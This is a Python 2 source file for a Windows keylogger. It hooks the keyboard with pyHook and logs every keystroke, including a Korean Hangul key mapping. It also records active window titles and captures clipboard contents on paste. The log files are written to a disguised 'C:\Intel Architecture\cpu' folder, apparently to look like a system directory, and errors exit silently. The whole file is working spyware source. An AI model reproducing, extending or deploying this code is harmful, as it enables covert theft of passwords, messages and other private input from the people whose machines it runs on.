#-*- coding: utf-8 -*-
import pyHook, pythoncom, win32clipboard, time, os
from ctypes import *
from datetime import datetime

user32=windll.user32
kernel32=windll.kernel32
psapi=windll.psapi
current_window=None
korEng=False
logFile="C:\\Intel Architecture\\cpu\\"+str(datetime.today().year)+"-"+str(datetime.today().month)+"-"+str(datetime.today().day)+"-"+str(datetime.today().hour)+"-"+str(datetime.today().minute)+"-"+str(datetime.today().second)+".txt"

def get_current_process():
    hwnd=user32.GetForegroundWindow()
    pid=c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    process_id="%d" % pid.value
    executable=create_string_buffer("\x00" *512)
    h_process=kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
    window_title=create_string_buffer("\x00" *512)
    length=user32.GetWindowTextA(hwnd, byref(window_title), 512)
    #print "\n[ PID: %s - %s - %s ]\n" % (process_id, executable.value, window_title.value)
    fp=open(logFile, "a")
    fp.write("\n\n[%s]\n" % window_title.value)
    fp.close()
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    
def KeyStroke(event):
    global current_window 
    global korEng
    if(event.WindowName!=current_window):
        current_window=event.WindowName        
        get_current_process()
    if(event.Ascii>32 and event.Ascii<127):
        #print event.Ascii
        if korEng:
            if(event.Ascii==33): saveContent("!")
            elif(event.Ascii==34): saveContent(''"")
            elif(event.Ascii==35): saveContent("#")
            elif(event.Ascii==36): saveContent("$")
            elif(event.Ascii==37): saveContent("%")
            elif(event.Ascii==38): saveContent("&")
            elif(event.Ascii==39): saveContent("'")
            elif(event.Ascii==40): saveContent("(")
            elif(event.Ascii==41): saveContent(")")
            elif(event.Ascii==42): saveContent("*")
            elif(event.Ascii==43): saveContent("+")
            elif(event.Ascii==44): saveContent(",")
            elif(event.Ascii==45): saveContent("-")
            elif(event.Ascii==46): saveContent(".")
            elif(event.Ascii==47): saveContent("/")
            elif(event.Ascii==48): saveContent("0")
            elif(event.Ascii==49): saveContent("1")
            elif(event.Ascii==50): saveContent("2")
            elif(event.Ascii==51): saveContent("3")
            elif(event.Ascii==52): saveContent("4")    
            elif(event.Ascii==53): saveContent("5")
            elif(event.Ascii==54): saveContent("6")
            elif(event.Ascii==55): saveContent("7")
            elif(event.Ascii==56): saveContent("8")
            elif(event.Ascii==57): saveContent("9")
            elif(event.Ascii==58): saveContent(":")
            elif(event.Ascii==59): saveContent(";")
            elif(event.Ascii==60): saveContent("<")
            elif(event.Ascii==61): saveContent("=")
            elif(event.Ascii==62): saveContent(">")
            elif(event.Ascii==63): saveContent("?")
            elif(event.Ascii==64): saveContent("@")
            elif(event.Ascii==65 | event.Ascii==97): saveContent("ㅁ")
            elif(event.Ascii==66 | event.Ascii==98): saveContent("ㅠ")
            elif(event.Ascii==67 | event.Ascii==99): saveContent("ㅊ")
            elif(event.Ascii==68 | event.Ascii==100): saveContent("ㅇ")
            elif(event.Ascii==69 | event.Ascii==101): saveContent("ㄷ")
            elif(event.Ascii==70 | event.Ascii==102): saveContent("ㄹ")
            elif(event.Ascii==71 | event.Ascii==103): saveContent("ㅎ")
            elif(event.Ascii==72 | event.Ascii==104): saveContent("ㅗ")
            elif(event.Ascii==73 | event.Ascii==105): saveContent("ㅑ")
            elif(event.Ascii==74 | event.Ascii==106): saveContent("ㅓ")
            elif(event.Ascii==75 | event.Ascii==107): saveContent("ㅏ")
            elif(event.Ascii==76 | event.Ascii==108): saveContent("ㅣ")
            elif(event.Ascii==77 | event.Ascii==109): saveContent("ㅡ")
            elif(event.Ascii==78 | event.Ascii==110): saveContent("ㅜ")
            elif(event.Ascii==79 | event.Ascii==111): saveContent("ㅐ")
            elif(event.Ascii==80 | event.Ascii==112): saveContent("ㅔ")
            elif(event.Ascii==81 | event.Ascii==113): saveContent("ㅂ")
            elif(event.Ascii==82 | event.Ascii==114): saveContent("ㄱ")
            elif(event.Ascii==83 | event.Ascii==115): saveContent("ㄴ")
            elif(event.Ascii==84 | event.Ascii==116): saveContent("ㅅ")
            elif(event.Ascii==85 | event.Ascii==117): saveContent("ㅕ")
            elif(event.Ascii==86 | event.Ascii==118): saveContent("ㅍ")
            elif(event.Ascii==87 | event.Ascii==119): saveContent("ㅈ")
            elif(event.Ascii==88 | event.Ascii==120): saveContent("ㅌ")
            elif(event.Ascii==89 | event.Ascii==121): saveContent("ㅛ")
            elif(event.Ascii==90 | event.Ascii==122): saveContent("ㅋ")
            elif(event.Ascii==91): saveContent("[")
            elif(event.Ascii==92): saveContent("\\")
            elif(event.Ascii==93): saveContent("]")
            elif(event.Ascii==94): saveContent("^")
            elif(event.Ascii==95): saveContent("_")
            elif(event.Ascii==96): saveContent("`")
            elif(event.Ascii==123): saveContent("{")
            elif(event.Ascii==124): saveContent("|")
            elif(event.Ascii==125): saveContent("}")
            elif(event.Ascii==126): saveContent("~")
        else:    
            saveContent(chr(event.Ascii))
    else:
        #print event.Key
        if str(event.Key)=="Hangul":
            if korEng: korEng=False
            else: korEng=True
        if event.Key=="V":
            win32clipboard.OpenClipboard()
            pasted_value=win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            saveContent(pasted_value)
        if(korEng and (str(event.Key)=="Lshift" or str(event.Key)=="Rshift")): saveContent("[Shift]")
        elif(event.Key=="Tab"): saveContent("[Tab]")
        elif(korEng and event.Key=="Capital"): saveContent("[CapsLock]")    
        elif(event.Key=="Lcontrol"): saveContent("[Ctrl]")    
        elif(event.Key=="Space"): saveContent(" ")    
        elif(event.Key=="Return"): saveContent("[Enter]")    
        elif(event.Key=="Left"): saveContent("[Left]")    
        elif(event.Key=="Right"): saveContent("[Right]")    
        elif(event.Key=="Back"): saveContent("[Backspace]")    
        elif(event.Key=="Delete"): saveContent("[Delete]")    
            
def saveContent(message):
    fp=open(logFile, "a")
    fp.write(str(unicode(message, "utf-8").encode("utf-8")))
    fp.close()   
            
def main():
    try:
        os.system("mkdir \"C:\\Intel Architecture\"")
        os.system("mkdir \"C:\\Intel Architecture\\cpu\"")
        fp=open(logFile, "w")
        fp.close()
        kl=pyHook.HookManager()
        kl.KeyDown=KeyStroke
        kl.HookKeyboard()
        pythoncom.PumpMessages()
    except Exception, e:
        exit(0)
        
if __name__=="__main__":
    main()
